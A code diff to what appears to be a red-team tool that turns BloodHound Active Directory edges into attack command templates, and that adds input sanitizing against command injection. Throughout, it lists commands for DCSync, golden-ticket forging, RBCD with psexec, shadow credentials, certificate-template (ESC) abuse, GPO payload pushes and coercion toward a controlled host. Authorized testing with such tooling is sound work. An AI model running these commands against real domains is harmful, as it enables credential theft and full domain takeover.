@@ -6,6 +6,8 @@ identity the attacker operates as AFTER exploiting this edge.
 
 from __future__ import annotations
 
+import re
+import shlex
 from dataclasses import dataclass, field
 
 
@@ -13,10 +15,35 @@ from dataclasses import dataclass, field
 class CommandSet:
     description: str
     commands: list[str] = field(default_factory=list)
+    preconditions: list[str] = field(default_factory=list)
+    confidence: str = "medium"
 
     @property
     def has_commands(self) -> bool:
         return bool(self.commands)
+
+
+def quote_posix(value: object) -> str:
+    """Quote one untrusted value as a POSIX shell argument."""
+    return shlex.quote(str(value))
+
+
+def quote_powershell(value: object) -> str:
+    """Quote one untrusted value as a PowerShell single-quoted string."""
+    return "'" + str(value).replace("'", "''") + "'"
+
+
+_SAFE_COMMAND_COMPONENT = re.compile(r"^[A-Za-z0-9_.@$:-]+$")
+
+
+def safe_command_component(value: str, placeholder: str) -> str:
+    """Keep legacy templates inert when an AD label contains shell syntax.
+
+    New templates use explicit quoting. Older templates mix quoted and
+    unquoted positions, so suspicious labels become an obvious placeholder
+    instead of copy/paste command injection.
+    """
+    return value if _SAFE_COMMAND_COMPONENT.fullmatch(value) else placeholder
 
 
 def _fqdn_to_dn(fqdn: str) -> str:
@@ -61,15 +88,26 @@ def _next_actor(
     """Return the identity the attacker operates as after this hop."""
     user_kinds = ("users", "")
 
-    if rel_type in ("ForceChangePassword", "AddKeyCredentialLink"):
+    if rel_type in (
+        "ForceChangePassword",
+        "AddKeyCredentialLink",
+        "DumpSMSAPassword",
+        "ReadGMSAPassword",
+        "SyncedToADUser",
+        "SyncedToEntraUser",
+        "WriteAltSecurityIdentities",
+        "WritePublicInformation",
+    ):
         return _computer_identity(dst_name) if dst_kind == "computers" else dst_name
     if rel_type in ("AllowedToDelegate", "AllowedToAct", "WriteAccountRestrictions"):
         dst = _parse(dst_name, dst_kind)
         return f"Administrator@{dst['domain']}"
-    if rel_type in ("GenericWrite", "GenericAll", "AllExtendedRights"):
+    if rel_type in ("GenericWrite", "GenericAll"):
         return _computer_identity(dst_name) if dst_kind == "computers" else (
             dst_name if dst_kind in user_kinds else current
         )
+    if rel_type == "AllExtendedRights":
+        return dst_name if dst_kind in user_kinds else current
     if rel_type in ("ReadLAPSPassword", "SyncLAPSPassword"):
         # Local admin password → on-host SYSTEM → AD auth uses the machine account.
         if dst_kind == "computers":
@@ -115,11 +153,11 @@ def get_commands(
     src = _parse(src_name or src_id, src_kind)
     dst = _parse(dst_name or dst_id, dst_kind)
 
-    A  = act["short"]   # attacker short name
-    D  = act["domain"]  # attacker domain
-    SF = src["fqdn"]    # source FQDN / display name
-    T  = dst["short"]   # target short name
-    TF = dst["fqdn"]    # target FQDN
+    A = safe_command_component(act["short"], "<SRC_ACCOUNT>")
+    D = safe_command_component(act["domain"], "<DOMAIN>")
+    SF = safe_command_component(src["fqdn"], "<SOURCE_OBJECT>")
+    T = safe_command_component(dst["short"], "<TARGET_OBJECT>")
+    TF = safe_command_component(dst["fqdn"], "<TARGET_FQDN>")
 
     PASS = "<SRC_PASSWORD>"
     HASH = "<NTLM_HASH>"
@@ -129,8 +167,42 @@ def get_commands(
 
     match rel_type:
 
-        case "MemberOf" | "Contains":
+        case (
+            "MemberOf"
+            | "Contains"
+            | "ContainsIdentity"
+            | "ClaimSpecialIdentity"
+            | "GPOAppliesTo"
+            | "HasSIDHistory"
+            | "PropagatesACEsTo"
+            | "SameForestTrust"
+            | "SyncedToADUser"
+            | "SyncedToEntraUser"
+        ):
             return CommandSet("Structural relationship — no action required."), na
+
+        case "ReadGMSAPassword":
+            return CommandSet(
+                f"Read the managed password for gMSA {TF} and derive its NT hash.",
+                [
+                    f"python3 gMSADumper.py -u '{A}' -p '{PASS}' -d '{D}' -l '<LDAP_SERVER>'",
+                    f"nxc ldap {DC} -d '{D}' -u '{A}' -p '{PASS}' --gmsa",
+                    f"impacket-getTGT '{D}/{T}' -hashes ':<GMSA_NT_HASH>' -dc-ip {DC}",
+                ],
+                ["Use the returned current managed-password hash for the exact gMSA target."],
+                confidence="high",
+            ), na
+
+        case "DumpSMSAPassword":
+            return CommandSet(
+                f"Retrieve the standalone managed service account secret for {TF}.",
+                [
+                    "# From an authorized Windows host, use DSInternals or the LSA secret associated with the sMSA:",
+                    f"Get-ADServiceAccount -Identity {quote_powershell(T)} -Properties msDS-HostServiceAccount",
+                    "# Extract the corresponding _SC_<service> / managed-service-account secret only after host control is confirmed.",
+                ],
+                ["Administrative control of an authorized host may be required to access the cached sMSA secret."],
+            ), na
 
         case "AdminTo":
             return CommandSet(
@@ -234,10 +306,14 @@ def get_commands(
                     f"Full control over user {TF} — reset password, shadow creds.",
                     [
                         "# Option 1 — force password reset:",
-                        f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
-                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
+                        f"net rpc password '{T}' '<NEW_PASSWORD>' -U '{D}/{A}%{PASS}' -S {DC}",
+                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' '<NEW_PASSWORD>'",
                         "# Option 2 — shadow credentials:",
                         f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
+                    ],
+                    [
+                        "Confirm the target is not protected by AdminSDHolder inheritance.",
+                        "Choose a new password that satisfies the domain policy.",
                     ],
                 ), na
             elif dst_kind == "domains":
@@ -257,16 +333,20 @@ def get_commands(
                     f"Full control over computer {TF} — RBCD or shadow credentials.",
                     [
                         "# Option 1 — Resource-Based Constrained Delegation (needs MachineAccountQuota>0):",
-                        f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
+                        f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass '<MACHINE_PASSWORD>' -dc-ip {DC}",
                         f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
-                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
+                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:<MACHINE_PASSWORD>' -dc-ip {DC}",
                         "export KRB5CCNAME=administrator.ccache",
                         f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                         "# Option 2 — shadow credentials (any case, no MAQ needed):",
                         f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}$' --action add --dc-ip {DC}",
                     ],
+                    [
+                        "RBCD requires a controlled principal with an SPN; creating one usually requires MachineAccountQuota > 0.",
+                        "The impersonated account must be delegable and not a member of Protected Users.",
+                    ],
                 ), na
-            else:
+            elif dst_kind == "groups":
                 return CommandSet(
                     f"Full control over group {TF} — add member.",
                     [
@@ -274,6 +354,62 @@ def get_commands(
                         f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                     ],
                 ), na
+            elif dst_kind == "gpos":
+                return CommandSet(
+                    f"Full control over GPO {TF} — modify its policy files.",
+                    [
+                        f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command '<PAYLOAD>' -taskname '<TASK_NAME>'",
+                    ],
+                    [
+                        "Resolve the GPO GUID and confirm where the GPO is linked.",
+                        "Wait for policy refresh or trigger it on an authorized test target.",
+                    ],
+                ), na
+            elif dst_kind in ("ous", "containers"):
+                return CommandSet(
+                    f"Full control over {dst_kind.rstrip('s')} {TF} — control descendants or its GPO link.",
+                    [
+                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' gPLink -v '<GPLINK_VALUE>'",
+                        f"dacledit.py -action write -rights FullControl -principal '{A}' -target-dn '<TARGET_DN>' '{D}/{A}:{PASS}' -dc-ip {DC}",
+                    ],
+                    ["Identify an affected descendant and verify ACL inheritance before claiming compromise."],
+                ), na
+            elif dst_kind == "certtemplates":
+                return CommandSet(
+                    f"Full control over certificate template {TF} — create an ESC4-to-ESC1 configuration.",
+                    [
+                        f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}",
+                        f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
+                    ],
+                    ["Confirm the template is enabled and published by a reachable enterprise CA."],
+                ), na
+            elif dst_kind == "enterprisecas":
+                return CommandSet(
+                    f"Full control over enterprise CA object {TF}.",
+                    [f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-templates -dc-ip {DC}"],
+                    ["Validate the effective CA management rights on the CA host before attempting ESC7 operations."],
+                ), na
+            elif dst_kind in (
+                "aiacas",
+                "rootcas",
+                "ntauthstores",
+                "issuancepolicies",
+            ):
+                return CommandSet(
+                    f"Full control over PKI object {TF}.",
+                    [],
+                    [
+                        "This object type requires PKI-specific validation; Pathdog will not emit a generic group command.",
+                        "Review the BloodHound edge details and the affected certificate chain or issuance policy.",
+                    ],
+                    confidence="low",
+                ), na
+            return CommandSet(
+                f"Full control over unsupported object type {dst_kind or 'unknown'}: {TF}.",
+                [],
+                ["Validate the target object type and select an object-specific abuse primitive."],
+                confidence="low",
+            ), na
 
         case "AllExtendedRights":
             if dst_kind == "domains":
@@ -285,12 +421,36 @@ def get_commands(
                         f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                     ],
                 ), na
+            if dst_kind in ("users", ""):
+                return CommandSet(
+                    f"All extended rights on user {TF} — force a password reset.",
+                    [
+                        f"net rpc password '{T}' '<NEW_PASSWORD>' -U '{D}/{A}%{PASS}' -S {DC}",
+                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' '<NEW_PASSWORD>'",
+                    ],
+                    ["Choose a password that satisfies the domain password policy."],
+                ), na
+            if dst_kind == "computers":
+                return CommandSet(
+                    f"All extended rights on computer {TF}.",
+                    [],
+                    [
+                        "Confirm which control-access rights are present (for example LAPS read or RBCD-related rights).",
+                        "AllExtendedRights is not rendered as a user password reset for computer objects.",
+                    ],
+                    confidence="low",
+                ), na
+            if dst_kind in ("certtemplates", "enterprisecas"):
+                return CommandSet(
+                    f"All extended rights on PKI object {TF}.",
+                    [f"certipy find -u '{A}@{D}' -p '{PASS}' -dc-ip {DC} -vulnerable -stdout"],
+                    ["Confirm effective enrollment or CA management rights before exploitation."],
+                ), na
             return CommandSet(
-                f"All extended rights on {TF} — includes ForceChangePassword.",
-                [
-                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
-                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
-                ],
+                f"All extended rights on {dst_kind or 'unknown'} object {TF}.",
+                [],
+                ["Resolve the specific extended rights before selecting an abuse command."],
+                confidence="low",
             ), na
 
         case "AddMember" | "AddSelf":
@@ -308,25 +468,72 @@ def get_commands(
             return CommandSet(
                 f"Force-reset the password of {TF} — no current password needed.",
                 [
-                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
-                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
+                    f"net rpc password '{T}' '<NEW_PASSWORD>' -U '{D}/{A}%{PASS}' -S {DC}",
+                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' '<NEW_PASSWORD>'",
                     "# PowerView:",
-                    f"Set-DomainUserPassword -Identity '{T}' -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Credential $Cred",
+                    f"Set-DomainUserPassword -Identity '{T}' -AccountPassword (ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force) -Credential $Cred",
                 ],
+                ["Choose a password that satisfies the domain password policy."],
             ), na
 
         case "GenericWrite":
             T_sam = f"{T}$" if dst_kind == "computers" else T
-            return CommandSet(
-                f"Generic write on {TF} — shadow credentials or WriteSPN + Kerberoast.",
-                [
-                    "# Option 1 — shadow credentials:",
+            if dst_kind in ("users", "computers", ""):
+                commands = [
+                    "# Shadow credentials:",
                     f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T_sam}' --action add --dc-ip {DC}",
-                    "# Option 2 — write fake SPN then Kerberoast:",
-                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T_sam}' servicePrincipalName -v 'fake/blah'",
-                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
-                    "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
-                ],
+                ]
+                prerequisites = ["PKINIT must be usable for the shadow-credentials workflow."]
+                if dst_kind in ("users", ""):
+                    commands.extend(
+                        [
+                            "# Alternative: targeted Kerberoasting:",
+                            f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T_sam}' servicePrincipalName -v 'fake/pathdog'",
+                            f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request-user '{T}' -outputfile spn_hash.txt",
+                            "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
+                        ]
+                    )
+                    prerequisites.append("The targeted SPN workflow still requires cracking the returned ticket.")
+                return CommandSet(
+                    f"Generic write on {dst_kind or 'user'} {TF}.",
+                    commands,
+                    prerequisites,
+                ), na
+            if dst_kind == "groups":
+                return CommandSet(
+                    f"Generic write on group {TF} — modify membership.",
+                    [f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'"],
+                ), na
+            if dst_kind == "gpos":
+                return CommandSet(
+                    f"Generic write on GPO {TF} — modify the policy payload.",
+                    [f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command '<PAYLOAD>' -taskname '<TASK_NAME>'"],
+                    ["Resolve the GPO GUID and identify linked, affected systems."],
+                ), na
+            if dst_kind in ("ous", "domains"):
+                return CommandSet(
+                    f"Generic write on {dst_kind.rstrip('s')} {TF} — modify gPLink.",
+                    [f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' gPLink -v '<GPLINK_VALUE>'"],
+                    ["Control a GPO and verify the link affects the intended descendants."],
+                ), na
+            if dst_kind == "certtemplates":
+                return CommandSet(
+                    f"Generic write on certificate template {TF} — ESC4 workflow.",
+                    [f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}"],
+                    ["Confirm the template is published and enrollment is available."],
+                ), na
+            if dst_kind == "issuancepolicies":
+                return CommandSet(
+                    f"Generic write on issuance policy {TF}.",
+                    [],
+                    ["Validate the OID group link and certificate mapping prerequisites before modifying the policy."],
+                    confidence="low",
+                ), na
+            return CommandSet(
+                f"Generic write on unsupported object type {dst_kind or 'unknown'}: {TF}.",
+                [],
+                ["Select an object-specific property and validate its downstream effect."],
+                confidence="low",
             ), na
 
         case "WriteSPN":
@@ -334,9 +541,10 @@ def get_commands(
                 f"Write SPN on {TF} then Kerberoast.",
                 [
                     f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
-                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
+                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request-user '{T}' -outputfile spn_hash.txt",
                     "hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                 ],
+                ["Crack the returned service ticket before treating the target as compromised."],
             ), na
 
         case "Owns" | "WriteOwner":
@@ -414,18 +622,23 @@ def get_commands(
                 ],
             ), na
 
-        case "AllowedToAct" | "WriteAccountRestrictions":
+        case "AddAllowedToAct" | "AllowedToAct" | "WriteAccountRestrictions":
             return CommandSet(
                 f"Resource-Based Constrained Delegation (RBCD) on {TF}.",
                 [
                     "# 1. Create a controlled computer account (needs MachineAccountQuota>0):",
-                    f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
+                    f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass '<MACHINE_PASSWORD>' -dc-ip {DC}",
                     f"# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on {TF}:",
                     f"rbcd.py -action write -delegate-from 'PWNED$' -delegate-to '{T}$' -dc-ip {DC} '{D}/{A}:{PASS}'",
                     "# 3. Get a service ticket as Administrator:",
-                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
+                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' -outfile administrator.ccache '{D}/PWNED$:<MACHINE_PASSWORD>' -dc-ip {DC}",
                     "export KRB5CCNAME=administrator.ccache",
                     f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
+                ],
+                [
+                    "Control a principal with an SPN; creating a computer usually requires MachineAccountQuota > 0.",
+                    "The impersonated account must not be marked sensitive or belong to Protected Users.",
+                    "Confirm the requested SPN is accepted by the target service.",
                 ],
             ), na
 
@@ -452,17 +665,92 @@ def get_commands(
                 ],
             ), na
 
-        case "TrustedBy" | "SameForestTrust" | "CrossForestTrust":
+        case "CanApplyGPO":
             return CommandSet(
-                f"Domain trust — {TF} trusts the current domain. Forge inter-realm TGT (SID-history attack).",
+                f"BloodHound confirms an applicable GPO-control primitive toward {TF}.",
+                [],
                 [
-                    "# 1. Get the krbtgt hash of the source domain (used to forge a Golden TGT with extra-sid):",
-                    f"impacket-secretsdump -just-dc-user '{D}\\krbtgt' '{D}/{A}:{PASS}@{DC}'",
-                    "# 2. Forge a Golden TGT impersonating Administrator with extra-sid pointing to target's DA SID:",
-                    f"impacket-ticketer -nthash '<KRBTGT_NTLM>' -domain-sid '<SRC_DOMAIN_SID>' -domain {D} -extra-sid '<DST_DOMAIN_SID>-519' -spn 'krbtgt/{TF}' Administrator",
-                    "export KRB5CCNAME=Administrator.ccache",
-                    f"impacket-psexec -k -no-pass '{TF}/Administrator@<DST_DC_FQDN>'",
+                    "Inspect the adjacent GPOAppliesTo edge and the GPO's exact writable primitive.",
+                    "Use the object-specific GenericAll/GenericWrite/WriteDacl guidance; Pathdog will not invent a GPO modification command without it.",
                 ],
+                confidence="medium",
+            ), na
+
+        case "WriteAltSecurityIdentities":
+            return CommandSet(
+                f"Write an explicit certificate mapping on user {TF}.",
+                [
+                    f"bloodyAD --host {DC} -d '{D}' -u '{A}' -p '{PASS}' set object '{T}' altSecurityIdentities -v '<X509_MAPPING>'",
+                    f"certipy auth -pfx '<CONTROLLED_CERTIFICATE.pfx>' -username '{T}' -domain '{D}' -dc-ip {DC}",
+                ],
+                [
+                    "Possess a certificate whose issuer/subject matches the mapping value.",
+                    "Confirm certificate authentication and mapping policy are enabled in the domain.",
+                ],
+            ), na
+
+        case "WritePublicInformation":
+            return CommandSet(
+                f"Write public-information attributes on user {TF}.",
+                [],
+                [
+                    "Identify the exact writable attribute and the BloodHound abuse primitive for this edge.",
+                    "Pathdog will not guess a generic LDAP modification for a 9.5-era edge.",
+                ],
+                confidence="low",
+            ), na
+
+        case "HasTrustKeys":
+            return CommandSet(
+                f"Use trust keys held by {SF} to authenticate as trust account {TF}.",
+                [
+                    "# On an administratively controlled source-domain DC:",
+                    "# mimikatz: lsadump::trust /patch",
+                    f"impacket-getTGT '{D}/{T}' -hashes ':<RC4_TRUST_KEY>' -dc-ip {DC}",
+                    f"export KRB5CCNAME={quote_posix(T + '.ccache')}",
+                ],
+                [
+                    "Administrative access to a source-domain DC is required to dump the trust keys.",
+                    "Trust accounts support Kerberos network logons, not NTLM or interactive logons.",
+                ],
+            ), na
+
+        case "SpoofSIDHistory":
+            return CommandSet(
+                f"Forge or inject SID history to claim the identity represented by {TF}.",
+                [
+                    "# Forge a Kerberos ticket with the validated extra SID:",
+                    f"impacket-ticketer -nthash '<KRBTGT_NTLM>' -domain-sid '<SOURCE_DOMAIN_SID>' -domain '{D}' -extra-sid '<TARGET_SID>' '{A}'",
+                ],
+                [
+                    "Obtain the relevant Kerberos key and validate trust direction plus SID-filtering behavior.",
+                    "Use the SID shown by BloodHound; do not assume Enterprise Admins or a fixed RID.",
+                ],
+            ), na
+
+        case "AbuseTGTDelegation" | "CoerceToTGT":
+            return CommandSet(
+                f"Abuse trust/delegation semantics to obtain a usable TGT for {TF}.",
+                [
+                    "# Capture or request the delegated TGT using Rubeus/krbrelayx after validating the trust path.",
+                    "# Rubeus.exe monitor /interval:1 /nowrap",
+                    f"coercer coerce -u '{A}' -p '{PASS}' -d '{D}' -l '<CONTROLLED_HOST>' -t '{TF}'",
+                ],
+                [
+                    "Confirm the exact trust direction, TGT delegation setting, SID filtering and controlled host prerequisites.",
+                    "A trust edge alone is not proof that coercion or ticket capture will succeed.",
+                ],
+            ), na
+
+        case "TrustedBy" | "CrossForestTrust":
+            return CommandSet(
+                f"Context-only domain trust involving {TF}; it is not an attack step by itself.",
+                [],
+                [
+                    "Look for a derived SpoofSIDHistory, AbuseTGTDelegation or HasTrustKeys edge.",
+                    "Validate direction, trust type, SID filtering and TGT delegation before attempting abuse.",
+                ],
+                confidence="low",
             ), na
 
         case "DCFor":
@@ -478,9 +766,9 @@ def get_commands(
                 f"Enrollment right on certificate template/CA {TF}. Combine with a vulnerable template (ESC1/2/3/...) for escalation.",
                 [
                     "# Find vulnerable templates:",
-                    f"certipy-ad find -u '{A}@{D}' -p '{PASS}' -dc-ip {DC} -vulnerable -stdout",
+                    f"certipy find -u '{A}@{D}' -p '{PASS}' -dc-ip {DC} -vulnerable -stdout",
                     "# Then request a cert (ESC1 example, requires SAN supplyable):",
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@{D}' -dc-ip {DC}",
                 ],
             ), na
 
@@ -488,10 +776,10 @@ def get_commands(
             return CommandSet(
                 f"Modify enrollment/name flag on template {TF} to enable SAN-based impersonation (ESC4 → ESC1).",
                 [
-                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -save-old",
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
                     "# Restore the template afterwards:",
-                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -configuration '{T}.json'",
+                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-configuration '<BACKUP_JSON>' -dc-ip {DC}",
                 ],
             ), na
 
@@ -500,11 +788,11 @@ def get_commands(
                 f"CA management/officer right on {TF} — approve a denied request or issue arbitrary certs.",
                 [
                     "# Inspect CA and find issued/pending requests:",
-                    f"certipy-ad ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-requests -dc-ip {DC}",
+                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -list-requests -dc-ip {DC}",
                     "# Approve a denied request:",
-                    f"certipy-ad ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -issue-request <REQ_ID> -dc-ip {DC}",
+                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -issue-request <REQ_ID> -dc-ip {DC}",
                     "# Or add yourself as Officer to enable approve/issue:",
-                    f"certipy-ad ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -add-officer '{A}' -dc-ip {DC}",
+                    f"certipy ca -u '{A}@{D}' -p '{PASS}' -ca '{T}' -add-officer '{A}' -dc-ip {DC}",
                 ],
             ), na
 
@@ -512,8 +800,8 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC1 — vulnerable template on {TF} allows arbitrary SAN. Issue a cert as Administrator.",
                 [
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
-                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
@@ -521,9 +809,9 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC3 — Enrollment Agent template on {TF}. Request agent cert then on-behalf-of Administrator.",
                 [
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template 'User' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
-                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template 'User' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
+                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
@@ -531,10 +819,10 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC4 — write rights over template {TF}. Make it ESC1-vulnerable then enroll.",
                 [
-                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -save-old",
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-default-configuration -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -upn 'Administrator@{D}' -dc-ip {DC}",
                     "# Restore template:",
-                    f"certipy-ad template -u '{A}@{D}' -p '{PASS}' -template '{T}' -dc-ip {DC} -configuration '{T}.json'",
+                    f"certipy template -u '{A}@{D}' -p '{PASS}' -template '{T}' -write-configuration '<BACKUP_JSON>' -dc-ip {DC}",
                 ],
             ), na
 
@@ -542,8 +830,8 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA {TF}. Any client cert template enrollment lets you supply a SAN.",
                 [
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '{T}' -template 'User' -upn 'Administrator@{D}' -dc-ip {DC}",
-                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{T}' -template 'User' -upn 'Administrator@{D}' -dc-ip {DC}",
+                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
@@ -552,12 +840,12 @@ def get_commands(
                 f"ADCS ESC9 — no security extension on template {TF}. Combine with GenericWrite on victim to swap UPN/dnsHostName.",
                 [
                     "# 1. Set victim's UPN to Administrator (or dnsHostName for ESC9b):",
-                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
+                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                     "# 2. Enroll using victim:",
-                    f"certipy-ad req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
                     "# 3. Restore UPN, then auth:",
-                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
-                    f"certipy-ad auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
+                    f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
@@ -565,10 +853,10 @@ def get_commands(
             return CommandSet(
                 "ADCS ESC10 — weak certificate mapping on DC. Same workflow as ESC9 (UPN/dnsHostName swap).",
                 [
-                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
-                    f"certipy-ad req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
